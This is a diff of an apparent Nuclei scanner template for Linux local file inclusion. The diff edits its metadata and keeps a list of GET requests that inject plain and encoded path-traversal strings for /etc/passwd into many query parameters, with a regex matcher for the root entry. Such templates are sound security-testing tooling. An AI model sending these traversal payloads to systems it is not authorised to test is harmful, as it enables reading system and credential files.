@@ -1,19 +1,13 @@
 id: linux-lfi-fuzzing
 
 info:
-  name: Linux - Local File Inclusion Fuzzing
+  name: Linux based LFI Fuzzing
   author: geeknik,unstabl3,pentest_swissky,sushantkamble,0xSmiley
   severity: high
-  description: Multiple fuzzes for /etc/passwd on passed URLs were conducted, leading to multiple instances of local file inclusion vulnerability.
-  classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
-    cvss-score: 7.5
-    cwe-id: CWE-200
-  metadata:
-    max-request: 22
-  tags: linux,lfi,fuzzing
+  description: Fuzzes for /etc/passwd on passed URLs
+  tags: linux,lfi,fuzz
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/?q=../../../etc/passwd&s=../../../etc/passwd&search=../../../etc/passwd&id=&action=../../../etc/passwd&keyword=../../../etc/passwd&query=../../../etc/passwd&page=../../../etc/passwd&keywords=../../../etc/passwd&url=../../../etc/passwd&view=../../../etc/passwd&cat=../../../etc/passwd&name=../../../etc/passwd&key=../../../etc/passwd&p=../../../etc/passwd"
@@ -38,11 +32,9 @@ http:
       - "{{BaseURL}}/file?filename=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
       - "{{BaseURL}}/file?name=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
       - "{{BaseURL}}/?q=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
-
     stop-at-first-match: true
     matchers:
       - type: regex
         regex:
           - "root:.*:0:0:"
         part: body
-# digest: 4a0a0047304502210087a307489eb418f0906031bfc714587a7a63d61d3d748d51d61d33634454363502205b0a0800d1c4a85649d92cc90161e84a8539243c735643c99f74bc57483a3d77:922c64590222798bb761d5b6d8e72950
